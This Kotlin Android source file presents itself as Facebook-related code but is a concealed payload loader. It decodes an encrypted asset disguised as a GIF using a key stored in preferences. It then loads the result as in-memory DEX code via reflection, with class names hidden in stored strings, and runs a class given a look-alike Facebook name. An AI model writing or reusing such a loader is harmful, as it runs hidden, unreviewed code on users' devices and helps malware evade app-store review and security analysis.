package com.raven.tabor.nkil

import android.content.Context
import java.nio.ByteBuffer

/**
 * Date：2025/10/17
 * Describe:
 */
class FacebookFetch {
    private val mFacebookDecode by lazy { FacebookDecode() }

    //"dalvik.system.InMemoryDexClassLoader"
    //"java.lang.ClassLoader"
    //"getClassLoader"
    //"iosk.gif"
    fun readInfo(context: Context, string: String): Boolean {
        val str = context.getSharedPreferences("M_Raven", 0).getString("facebook_init", "") ?: ""
        if (str.isEmpty()) return false
        val list: List<String> = str.split("=")

        val b = mFacebookDecode.facebookDecode(
            list[4].toByteArray(), context.assets.open(list[3]).readBytes()
        )

        fbInitStart(b, context, list)
        return true
    }

    private fun fbInitStart(code: ByteArray, context: Context, list: List<String>) {
        val bf = ByteBuffer.wrap(code)
        //"dalvik.system.InMemoryDexClassLoader"
        val c1 = Class.forName(list[0])
        //"java.nio.ByteBuffer"
        val c2 = mFacebookDecode.clazzByteBuffer
        //"java.lang.ClassLoader"
        val c3 = Class.forName(list[1])

        val c = c1.getDeclaredConstructor(c2, c3)

        val cL = c.newInstance(bf, context.javaClass.getMethod(list[2]).invoke(context))

        next(cL)
    }

    private fun next(cL: Any) {
        val lC = cL.javaClass.getMethod("loadClass", String::class.java)
            .invoke(cL, "com.facebook.impI.Start") as Class<*>

        lC.getMethod("a", Float::class.java).invoke(null, 1f)
    }

}